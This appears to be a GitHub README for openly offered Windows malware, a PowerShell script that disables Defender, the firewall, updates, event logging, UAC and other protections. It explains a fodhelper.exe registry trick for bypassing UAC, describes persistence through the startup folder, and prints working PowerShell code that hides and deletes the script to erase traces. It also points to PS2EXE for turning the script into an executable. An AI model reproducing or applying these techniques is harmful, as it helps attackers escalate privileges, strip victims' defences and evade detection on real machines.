<div align=center>

# MALWARE AHEAD! IF YOU DO NOT KNOW WHAT THAT IS, LEAVE.

<img src="https://github.com/isPique/Fuck-Windows-Security/assets/139041426/c5ba97ec-e662-48fd-980d-a694694870cf" width="700">

</div>

<br>

>***WARNING!! This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!***

# How does this script work?

* Well, if we want to disable Windows's security features, we can use **Registry Editor** for that. However, we will need administrative privileges to access regedit. Like who's gonna run a malware as administrator?

  ## Privilege Escalation

  - In Windows, when a user is requesting to open **“Manage Optional Features”** in settings, a process is created under the name **“fodhelper.exe”**. This process is running with the highest privileges without any permissions being asked directly when executed because it's a trusted binary and signed by Microsoft.

  - The following checks are performed in the registry upon start of **fodhelper.exe**:

  > ```plaintext
  > HKCU:\Software\Classes\ms-settings\shell\open\command
  > HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute
  > HKCU:\Software\Classes\ms-settings\shell\open\command\(default)
  > ```

  - Since these registry entries doesn’t exist, we can create this structure in the registry to manipulate fodhelper to execute our script with higher privileges bypassing the **User Account Control (UAC)**.

## Features that the script will disable:
  ```plaintext
  - All The Windows Defender Features (including SmartScreen)
  - Windows Firewall
  - Windows Update
  - System Restore
  - Task Manager
  - Command Prompt (Cmd)
  - Remote Desktop
  - User Account Control (UAC)
  - Windows Security Center
  - Windows Error Reporting
  - Remote Assistance
  - Windows Update Medic Service
  - Background Intelligent Transfer Service (BITS)
  - Windows Script Host
  - Event Logging
  - Windows Security Notifications
  - Windows Search
  - Automatic Maintenance
  - Virtualization Based Security
  ```

## Self Replication and Self Destruction

* After disabling the Windows Security features, the script will copy itself to the startup folder with a random file name for persistence and will delete all traces of its execution.

* However, when the script is compiled and executed as an ".exe" file, it becomes a process, and we can no longer modify or delete the file itself due to the **[File Locking Mechanism](https://en.wikipedia.org/wiki/File_locking)**.

* Since we couldn't delete the script itself after it has done its job, we have 2 alternatives to delete it:

```powershell
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }

# First alternative: Start another process to delete it
Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden

# Second alternative: Create a temporary batch script to delete it
$tempScript = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + ".cmd")
$cmdContent = "chcp 1252" + [Environment]::NewLine + "ping 127.0.0.1 -n 2 > nul" + [Environment]::NewLine + "del /q /f `"$FullPath`"" + [Environment]::NewLine + "del /q /f %~f0"
Set-Content -Path $tempScript -Value $cmdContent
Start-Process cmd.exe -ArgumentList "/c $tempScript" -WindowStyle Hidden
```

> ***The first alternative has been used in the script.***

# Note
### You can use the [PS2EXE](https://www.advancedinstaller.com/convert-powershell-to-exe) tool to convert the script into an executable.

### If you executed the script, you can also run the `Enable.reg` file to repair the damage it caused.
